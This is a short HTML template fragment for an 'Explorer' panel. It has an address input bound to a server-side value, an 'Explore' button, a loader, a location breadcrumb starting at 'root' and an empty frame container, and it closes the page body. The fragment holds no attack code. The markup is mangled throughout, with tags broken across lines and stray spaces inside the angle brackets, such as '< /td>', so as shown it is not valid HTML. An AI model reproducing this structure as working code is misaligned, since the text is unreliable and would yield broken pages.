                <
                table >
                <
                tr >
                <
                td class = "h" > Explorer < /td> <
                td class = "b" >
                <
                t > Address: < /t> <
                    input name = "exadd"
                class = "mmm"
                type = "text"
                value = '<%= exadd %>'
                onkeypress = "return checkEnter(event);" / >
                <
                input type = "submit"
                value = "Explore"
                onclick = "sendAddress();"
                style = "margin-right:5px;" / >
                <
                span id = "loader"
                class = "loader"
                style = "display:none" > < /span> <
                /td> <
                /tr> <
                /table> <
                hr / >
                <
                div id = "objLocation" >
                <
                div class = "objLabel" > Location: < /div><div class="objD objL" onclick="setAddress(this.innerText);">root</div >
                    <
                    /div> <
                    div id = "objFrame" >
                    <
                    /div> <
                    /div> <
                    /body> <
                    /html>